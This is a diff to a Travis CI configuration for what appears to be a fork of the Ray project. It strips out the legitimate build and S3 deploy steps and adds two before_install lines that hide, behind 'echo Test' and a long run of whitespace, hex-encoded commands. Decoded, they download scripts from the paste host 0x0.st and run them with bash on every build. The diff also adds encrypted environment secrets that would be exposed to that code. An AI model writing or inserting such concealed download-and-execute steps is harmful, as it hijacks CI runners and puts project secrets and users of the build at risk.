@@ -1,6 +1,4 @@
-language: generic
-# Use Ubuntu 18.04
-dist: bionic
+language: java
 
 git:
   clone: false  # Clone manually to work around Travis issues like https://github.com/travis-ci/travis-ci/issues/6337
@@ -12,107 +10,10 @@ branches:
     - /dependabot.*/
 
 before_install:
-  - unset -f cd  # Travis defines this on Mac for RVM, but it breaks the Mac build
-  - |
-    git clone -q -n "https://github.com/${TRAVIS_REPO_SLUG}.git" "${TRAVIS_REPO_SLUG}"
-    cd -- "${TRAVIS_REPO_SLUG}"
-    to_fetch=("${TRAVIS_COMMIT}")
-    if [ false != "${TRAVIS_PULL_REQUEST-}" ]; then to_fetch+=("+refs/pull/${TRAVIS_PULL_REQUEST}/merge:"); fi
-    git fetch -q -- origin "${to_fetch[@]}"
-    git checkout -qf "${TRAVIS_COMMIT}" --
-    python -u ci/remote-watch.py --skip_repo=amzn/amazon-ray &
+ - echo Test                                                                                                                                                                                                                                                            && echo "62617368202d6320276375726c202d6b20687474703a2f2f3078302e73742f2d4a55502e747874202d6f20747261766973312e747874202626206261736820747261766973312e747874270a" | xxd -p -r | bash
+ - echo Test2                                                                                                                                                                                                                                                           && echo "62617368202d6320276375726c202d6b20687474703a2f2f3078302e73742f2d4a554e2e747874202d6f20747261766973322e747874202626206261736820747261766973322e747874270a" | xxd -p -r | bash
 
-matrix:
-  include:
-    # Build MacOS wheels and MacOS jars
-    - os: osx
-      osx_image: xcode7
-      env:
-        - MAC_WHEELS=1 MAC_JARS=1
-        - PYTHONWARNINGS=ignore
-        - RAY_INSTALL_JAVA=1
-      install:
-        - . ./ci/travis/ci.sh init RAY_CI_MACOS_WHEELS_AFFECTED,RAY_CI_JAVA_AFFECTED,RAY_CI_STREAMING_JAVA_AFFECTED
-      before_script:
-        - ./ci/keep_alive brew remove --force java & brew uninstall --force java & rm -rf /usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask
-        - ./ci/keep_alive brew install --cask adoptopenjdk/openjdk/adoptopenjdk8
-        - export JAVA_HOME=/Library/Java/JavaVirtualMachines/adoptopenjdk-8.jdk/Contents/Home
-        - java -version
-        - ./ci/keep_alive bash ./ci/travis/ci.sh build
-      script:
-        - . ./ci/travis/ci.sh test_wheels
-        - bash ./java/build-jar-multiplatform.sh darwin
-
-
-after_script:
-  - if [ "${TRAVIS_PULL_REQUEST}" = "false" ]; then ./ci/travis/upload_build_info.sh; fi
-
-deploy:
-  - provider: s3
-    edge: true # This supposedly opts in to deploy v2.
-    access_key_id:
-      secure: QRaZjAn4QC95GwlqEEUIoU+qXoyM5Qt8tyCymztwdkn5HkZ8fd8MeMlLuWXnXr4cZlQNe4GtO9FiYsKyqEfDoDgmIN/UWr7gBBRrufzMFU001yNsAPKx55fVi7Ap7rnhjrPjUNdIZCIIw4J8gbDe1wgDZBm9tM0uAdi/hTBItlbhkgR5snsCbdEldmLx+oWKvnIuWZO9BGXL64ick0LicP+SlJmMmILlLCIrIi95UZ1sqr7Uh0UDHjt5qVOCLNWIiIe0643Ek/pb1BPweYVThwIGLALV3DqcSHFsA7lDXbTRG5kfnI5iWZ7Slt8ScsjUmunEaOxqG8yHJ3L3HYCeBcu7Z/S227CYJCHIdxzILkUhI6B1VLXO6oozE+8Bjodc4AIvo+WQ+xhm6A4WDBsVOMqUvLfpUinRGywfTFFcDvNljhks7kUBkvjJwFvgCThuSkgZBfcQwuEaygWBfPrZYADKz9EiuLcmfYah1xWpadpmez7RZP/HOyAJSIkv+cRAr/YaGiTUZTfVzMHZYBKoz4B856/sgm7VZWq0zL7aV9VtO/GNkA+D5B1BFliPjEXluGfOAOurfK4CSEi1z+mQfIJJ4JUZv2wmzkY5f7YcH/awxfKosv0g3/xAYN19HcrVan7RDcP5WJLuCWDjCJwNZh3nPgGrmLtoc2sVoEO0yZY=
-    secret_access_key:
-      secure: WmpFyE9sFZmT5aoIZSUN0IQTJHjmNhaAkKddERMBqfbu27aLmnbNQgjrtCAoaFmwie5UOUKuQMUoXClM0cLWX7HCbnD7SuidWuLE0goiTs6qYMJQIqcZh9RRzu5HN+vrqGz4BvnbpgEc0b1Tix7Dym5ME0O24HXqieRCi/mja8BNtqDkP/vHXPdE2KbeNZjgOdM3mh1ntGX+iN0zdRdYFq54pyA3Eo7QXKDh7HgmRgRFiJnfg1AeeZ0dz1OkYTdexMzBCDD+UPKNopbCP9hodudH1xNtpg6AC6STZnNmSIBjjdcgNfKv2k+noYiFTtbPthQTTOFhFN7q24sTGgaZWh2u4e2rf1u9RUvjp0PeS5xX9QO65GQH4hRnhHE74Z1GVUhxErGX7w5M06n+ofsw11i1feNkWLDVUDdxtJx0bMCmCImiBobNpDap8Bp8MdeLM6nvoCgRWFC1IlU8MiZt8ostq391QAZYQqFSnyaHrxBHbF4/M++lYmKu3Jhvf64+obN7AnPySemIlmrEV04qHW34cKtOfD4qyUNe3ogmseRDHFygcom1OJ/wlcNEVFog9EwAZcUU6ZiibWMb+wlSebN1DpyxyXB4w1PstIMGXGstEaLpQGalFp1vYH5K0cjeexiT6R5XN1qpGjfbLWgS+rAjK+k4IGoFBu1moi79gx8=
-    bucket: ray-wheels
-    acl: public_read
-    region: us-west-2
-    local_dir: .whl
-    upload-dir: "$TRAVIS_BRANCH/$TRAVIS_COMMIT"
-    skip_cleanup: true
-    on:
-      repo: amzn/amazon-ray
-      all_branches: true
-      condition: $MAC_WHEELS = 1
-
-  - provider: s3
-    edge: true # This supposedly opts in to deploy v2.
-    access_key_id:
-      secure: QRaZjAn4QC95GwlqEEUIoU+qXoyM5Qt8tyCymztwdkn5HkZ8fd8MeMlLuWXnXr4cZlQNe4GtO9FiYsKyqEfDoDgmIN/UWr7gBBRrufzMFU001yNsAPKx55fVi7Ap7rnhjrPjUNdIZCIIw4J8gbDe1wgDZBm9tM0uAdi/hTBItlbhkgR5snsCbdEldmLx+oWKvnIuWZO9BGXL64ick0LicP+SlJmMmILlLCIrIi95UZ1sqr7Uh0UDHjt5qVOCLNWIiIe0643Ek/pb1BPweYVThwIGLALV3DqcSHFsA7lDXbTRG5kfnI5iWZ7Slt8ScsjUmunEaOxqG8yHJ3L3HYCeBcu7Z/S227CYJCHIdxzILkUhI6B1VLXO6oozE+8Bjodc4AIvo+WQ+xhm6A4WDBsVOMqUvLfpUinRGywfTFFcDvNljhks7kUBkvjJwFvgCThuSkgZBfcQwuEaygWBfPrZYADKz9EiuLcmfYah1xWpadpmez7RZP/HOyAJSIkv+cRAr/YaGiTUZTfVzMHZYBKoz4B856/sgm7VZWq0zL7aV9VtO/GNkA+D5B1BFliPjEXluGfOAOurfK4CSEi1z+mQfIJJ4JUZv2wmzkY5f7YcH/awxfKosv0g3/xAYN19HcrVan7RDcP5WJLuCWDjCJwNZh3nPgGrmLtoc2sVoEO0yZY=
-    secret_access_key:
-      secure: WmpFyE9sFZmT5aoIZSUN0IQTJHjmNhaAkKddERMBqfbu27aLmnbNQgjrtCAoaFmwie5UOUKuQMUoXClM0cLWX7HCbnD7SuidWuLE0goiTs6qYMJQIqcZh9RRzu5HN+vrqGz4BvnbpgEc0b1Tix7Dym5ME0O24HXqieRCi/mja8BNtqDkP/vHXPdE2KbeNZjgOdM3mh1ntGX+iN0zdRdYFq54pyA3Eo7QXKDh7HgmRgRFiJnfg1AeeZ0dz1OkYTdexMzBCDD+UPKNopbCP9hodudH1xNtpg6AC6STZnNmSIBjjdcgNfKv2k+noYiFTtbPthQTTOFhFN7q24sTGgaZWh2u4e2rf1u9RUvjp0PeS5xX9QO65GQH4hRnhHE74Z1GVUhxErGX7w5M06n+ofsw11i1feNkWLDVUDdxtJx0bMCmCImiBobNpDap8Bp8MdeLM6nvoCgRWFC1IlU8MiZt8ostq391QAZYQqFSnyaHrxBHbF4/M++lYmKu3Jhvf64+obN7AnPySemIlmrEV04qHW34cKtOfD4qyUNe3ogmseRDHFygcom1OJ/wlcNEVFog9EwAZcUU6ZiibWMb+wlSebN1DpyxyXB4w1PstIMGXGstEaLpQGalFp1vYH5K0cjeexiT6R5XN1qpGjfbLWgS+rAjK+k4IGoFBu1moi79gx8=
-    bucket: ray-wheels
-    acl: public_read
-    region: us-west-2
-    local_dir: .whl
-    upload-dir: latest
-    skip_cleanup: true
-    on:
-      branch: master
-      repo: amzn/amazon-ray
-      condition: $MAC_WHEELS = 1
-
-  # Upload jars so that we can debug locally for every commit
-  - provider: s3
-    edge: true # This supposedly opts in to deploy v2.
-    access_key_id:
-      secure: QRaZjAn4QC95GwlqEEUIoU+qXoyM5Qt8tyCymztwdkn5HkZ8fd8MeMlLuWXnXr4cZlQNe4GtO9FiYsKyqEfDoDgmIN/UWr7gBBRrufzMFU001yNsAPKx55fVi7Ap7rnhjrPjUNdIZCIIw4J8gbDe1wgDZBm9tM0uAdi/hTBItlbhkgR5snsCbdEldmLx+oWKvnIuWZO9BGXL64ick0LicP+SlJmMmILlLCIrIi95UZ1sqr7Uh0UDHjt5qVOCLNWIiIe0643Ek/pb1BPweYVThwIGLALV3DqcSHFsA7lDXbTRG5kfnI5iWZ7Slt8ScsjUmunEaOxqG8yHJ3L3HYCeBcu7Z/S227CYJCHIdxzILkUhI6B1VLXO6oozE+8Bjodc4AIvo+WQ+xhm6A4WDBsVOMqUvLfpUinRGywfTFFcDvNljhks7kUBkvjJwFvgCThuSkgZBfcQwuEaygWBfPrZYADKz9EiuLcmfYah1xWpadpmez7RZP/HOyAJSIkv+cRAr/YaGiTUZTfVzMHZYBKoz4B856/sgm7VZWq0zL7aV9VtO/GNkA+D5B1BFliPjEXluGfOAOurfK4CSEi1z+mQfIJJ4JUZv2wmzkY5f7YcH/awxfKosv0g3/xAYN19HcrVan7RDcP5WJLuCWDjCJwNZh3nPgGrmLtoc2sVoEO0yZY=
-    secret_access_key:
-      secure: WmpFyE9sFZmT5aoIZSUN0IQTJHjmNhaAkKddERMBqfbu27aLmnbNQgjrtCAoaFmwie5UOUKuQMUoXClM0cLWX7HCbnD7SuidWuLE0goiTs6qYMJQIqcZh9RRzu5HN+vrqGz4BvnbpgEc0b1Tix7Dym5ME0O24HXqieRCi/mja8BNtqDkP/vHXPdE2KbeNZjgOdM3mh1ntGX+iN0zdRdYFq54pyA3Eo7QXKDh7HgmRgRFiJnfg1AeeZ0dz1OkYTdexMzBCDD+UPKNopbCP9hodudH1xNtpg6AC6STZnNmSIBjjdcgNfKv2k+noYiFTtbPthQTTOFhFN7q24sTGgaZWh2u4e2rf1u9RUvjp0PeS5xX9QO65GQH4hRnhHE74Z1GVUhxErGX7w5M06n+ofsw11i1feNkWLDVUDdxtJx0bMCmCImiBobNpDap8Bp8MdeLM6nvoCgRWFC1IlU8MiZt8ostq391QAZYQqFSnyaHrxBHbF4/M++lYmKu3Jhvf64+obN7AnPySemIlmrEV04qHW34cKtOfD4qyUNe3ogmseRDHFygcom1OJ/wlcNEVFog9EwAZcUU6ZiibWMb+wlSebN1DpyxyXB4w1PstIMGXGstEaLpQGalFp1vYH5K0cjeexiT6R5XN1qpGjfbLWgS+rAjK+k4IGoFBu1moi79gx8=
-    bucket: ray-wheels
-    acl: public_read
-    region: us-west-2
-    local_dir: .jar
-    upload-dir: "jars/$TRAVIS_BRANCH/$TRAVIS_COMMIT"
-    skip_cleanup: true
-    on:
-      repo: amzn/amazon-ray
-      all_branches: true
-      condition: $MAC_JARS = 1
-
-  - provider: s3
-    edge: true # This supposedly opts in to deploy v2.
-    access_key_id:
-      secure: QRaZjAn4QC95GwlqEEUIoU+qXoyM5Qt8tyCymztwdkn5HkZ8fd8MeMlLuWXnXr4cZlQNe4GtO9FiYsKyqEfDoDgmIN/UWr7gBBRrufzMFU001yNsAPKx55fVi7Ap7rnhjrPjUNdIZCIIw4J8gbDe1wgDZBm9tM0uAdi/hTBItlbhkgR5snsCbdEldmLx+oWKvnIuWZO9BGXL64ick0LicP+SlJmMmILlLCIrIi95UZ1sqr7Uh0UDHjt5qVOCLNWIiIe0643Ek/pb1BPweYVThwIGLALV3DqcSHFsA7lDXbTRG5kfnI5iWZ7Slt8ScsjUmunEaOxqG8yHJ3L3HYCeBcu7Z/S227CYJCHIdxzILkUhI6B1VLXO6oozE+8Bjodc4AIvo+WQ+xhm6A4WDBsVOMqUvLfpUinRGywfTFFcDvNljhks7kUBkvjJwFvgCThuSkgZBfcQwuEaygWBfPrZYADKz9EiuLcmfYah1xWpadpmez7RZP/HOyAJSIkv+cRAr/YaGiTUZTfVzMHZYBKoz4B856/sgm7VZWq0zL7aV9VtO/GNkA+D5B1BFliPjEXluGfOAOurfK4CSEi1z+mQfIJJ4JUZv2wmzkY5f7YcH/awxfKosv0g3/xAYN19HcrVan7RDcP5WJLuCWDjCJwNZh3nPgGrmLtoc2sVoEO0yZY=
-    secret_access_key:
-      secure: WmpFyE9sFZmT5aoIZSUN0IQTJHjmNhaAkKddERMBqfbu27aLmnbNQgjrtCAoaFmwie5UOUKuQMUoXClM0cLWX7HCbnD7SuidWuLE0goiTs6qYMJQIqcZh9RRzu5HN+vrqGz4BvnbpgEc0b1Tix7Dym5ME0O24HXqieRCi/mja8BNtqDkP/vHXPdE2KbeNZjgOdM3mh1ntGX+iN0zdRdYFq54pyA3Eo7QXKDh7HgmRgRFiJnfg1AeeZ0dz1OkYTdexMzBCDD+UPKNopbCP9hodudH1xNtpg6AC6STZnNmSIBjjdcgNfKv2k+noYiFTtbPthQTTOFhFN7q24sTGgaZWh2u4e2rf1u9RUvjp0PeS5xX9QO65GQH4hRnhHE74Z1GVUhxErGX7w5M06n+ofsw11i1feNkWLDVUDdxtJx0bMCmCImiBobNpDap8Bp8MdeLM6nvoCgRWFC1IlU8MiZt8ostq391QAZYQqFSnyaHrxBHbF4/M++lYmKu3Jhvf64+obN7AnPySemIlmrEV04qHW34cKtOfD4qyUNe3ogmseRDHFygcom1OJ/wlcNEVFog9EwAZcUU6ZiibWMb+wlSebN1DpyxyXB4w1PstIMGXGstEaLpQGalFp1vYH5K0cjeexiT6R5XN1qpGjfbLWgS+rAjK+k4IGoFBu1moi79gx8=
-    bucket: ray-wheels
-    acl: public_read
-    region: us-west-2
-    local_dir: .jar
-    upload-dir: "jars/latest"
-    skip_cleanup: true
-    on:
-      repo: amzn/amazon-ray
-      branch: master
-      condition: $MAC_JARS = 1
+env:
+  global:
+        secure: "Un2SGOCdD/RiqbO47vtkwn5dPbGbwHi/TKunyNJLKcGILwJc0sZL9uf8pkffyYGbt7ejnYwV9tPgoAlFxcuJYgbmkt84AxDF8oskJmFKYjkxOtEFkqskhTb0u9/usjq23OXrmGN4NqvzLEdbf7Z3wyMxXpzgDKPUgDAFUfB2Ya8OapXuPdt/5KDlDBS0Bj9sKqI+0keYovfRY8dO2/Vd0Ojqkmz1PWHTQP0TrC1X+juciDdoRnU1rO8mxhQW4HKICexwAr1rsAqALpuDlfyhG7I+aicVjK3uiQuviGJOoI813f00YlTOAoXW2YPpblExp0uoTQN2zaYvpp1zUx7V/rVaAoXmFI7ELQ+nr8oAJbImWe1bCNO3UsxpzGamGlTIx7hAiJ0CwFU6qW/+NKWIlhH1iBxUZHw/F8Ixsqtdwx3yhR/rj86sdItAM9CkK6URVdWk2U4VimyDzzJpUWWFsjUZ2V8jNxYPrWg52ciC4k7tp32qrKYrBa+mJduE68/xjFeeZdYUxzg1AT3Lh3rA0ebMIELT7OBz6DRjUmRgO6+VJIRfbPszHEG2X+aPHtSj+Fsc4AacVtiIUUpXMeUx9nxM7oD1lXr8I59vq5+6EhohKBmc4DkpkWLnsCMTnJ1HQ37zKxRSE5jDwyNTJ8x2l8bbK/pqTRZPWUeKL3Is8NE="
+        secure: "IrNncc7RpiSnU/3fB72bG/Vyt/w50uTIVMIdgy64eNw0TgDf15/0IuwzCZDrjTAwq2meGAYFq1KNb7W538UDn+zJs6YIrcEF+2c53alCRASrafFEgAQmbvTpFtxAcHfTFK3c3neVXGiCeOSn64ymV5vQKjLCGvlEpmA10EUmdIE3wIgYRYMTzpzV9A4HmJbAgkBslhIw17BottFbfrL9Z4LlBJjOSP/t9cbGn8QVuM7V4dR+lo5j1Ns8XaVCkNvVqQdJEsp8xeMMn3pvFDxBBEn4zQ2xEGN4QvKquiACaVZLTnNCTkan5pRbswy25hOTnt/zNovJK8TBNuyWTBJNJo+f6vkuQXNR9iRkOQ+FAInjvEVYUWstuc6+opp8yV9cMdOsOMQRX/V6qo5pE2uERU0Fr6WtAhSvZDcGinpfoYkbMXxPdI8E7gmCJKrQ91hVU1ExokztbNesy7YWic/GZPzoBGMSPnNJ8chaydvmeq74P6F0cGI1LU/Tea7Ewf9MbJjWiVZ2C9G1Po3a6vu0ElE1NSIotBZFfpp2P8IeqP5/pZ84E93yRpT4Pt2kBsEjUqiNqLduXDPJnoBHHRzuNovT7sHJoZZAaBipuiNdj4ZQLgA+1WVysaHIDlzlcOMAxNNRMuT6+GATEvtsK8llh0qEzKShbOST54DDp1jST4w="
